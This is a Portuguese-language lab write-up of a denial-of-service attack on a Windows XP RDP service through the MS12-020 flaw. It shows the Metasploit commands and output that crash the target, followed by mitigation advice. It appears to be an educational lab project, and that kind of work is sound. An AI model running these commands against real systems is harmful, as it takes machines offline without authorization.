# Ataque de Negação de Serviço (DoS): Explorando a Vulnerabilidade MS12-020 (RDP)

Este projeto documenta a execução de um ataque de Negação de Serviço (Denial of Service - DoS) contra o serviço de Área de Trabalho Remota (RDP) de um sistema Windows legado. O objetivo é demonstrar o impacto crítico de vulnerabilidades não corrigidas no nível de kernel do sistema operacional.

> **Aviso Legal:** Este projeto foi realizado em um ambiente de laboratório estritamente controlado e isolado (VirtualBox). Todas as técnicas aqui documentadas têm fins educacionais e de pesquisa acadêmica em Segurança da Informação. 

## Topologia e Ambiente
* **Atacante:** Kali Linux 
* **Alvo Vulnerável:** Windows XP (IP: 192.168.56.103)
* **Serviço Alvo:** Remote Desktop Protocol (RDP) - Porta TCP 3389

## A Vulnerabilidade (MS12-020)
A falha MS12-020 é uma vulnerabilidade crítica de execução remota de código e negação de serviço no protocolo RDP do Windows. O problema ocorre devido à forma como o serviço lida com a alocação de memória na criação de canais virtuais (*Use-After-Free*). Pacotes malformados enviados ao servidor RDP causam corrupção de memória, forçando o Kernel do Windows a um estado de erro crítico (BSOD - Blue Screen of Death).

## Metodologia de Ataque

### 1. Configuração do Framework
Utilizamos o Metasploit Framework no Kali Linux para carregar o módulo auxiliar responsável por engatilhar a vulnerabilidade sem a necessidade de autenticação prévia.

    msfconsole
    msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set rhosts 192.168.56.103

### 2. Execução e Resultados
O payload de 210 bytes foi enviado ao serviço alvo. A comunicação foi imediatamente interrompida, validando o crash do servidor.

    msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
    [*] Running module against 192.168.56.103
    [*] 192.168.56.103:3389 - 192.168.56.103:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
    [*] 192.168.56.103:3389 - 192.168.56.103:3389 - 210 bytes sent
    [*] 192.168.56.103:3389 - 192.168.56.103:3389 - Checking RDP status...
    [+] 192.168.56.103:3389 - 192.168.56.103:3389 seems down
    [*] Auxiliary module execution completed

**Impacto Comprovado:** O sistema Windows XP alvo sofreu uma falha crítica de Kernel (BSOD / Tela Azul), resultando em indisponibilidade total da máquina e necessidade de reinicialização física/manual.

## Mitigação e Boas Práticas
Para proteger ambientes corporativos contra esse e outros ataques ao RDP:
1. **Gestão de Patches:** Aplicar imediatamente as atualizações de segurança fornecidas pela Microsoft (Boletim MS12-020).
2. **Network Level Authentication (NLA):** Habilitar a Autenticação no Nível da Rede. O NLA exige que o usuário se autentique *antes* que a sessão RDP seja criada, bloqueando a maioria das explorações anônimas.
3. **Restrição de Acesso (Firewall/VPN):** Nunca expor a porta 3389 diretamente à internet. O acesso RDP deve ser feito exclusivamente através de túneis VPN e restrito a IPs de administração autorizados via regras de Firewall estritas.
4. **Desativação de Serviços:** Se a Área de Trabalho Remota não for uma necessidade de negócio, o serviço deve permanecer desabilitado.
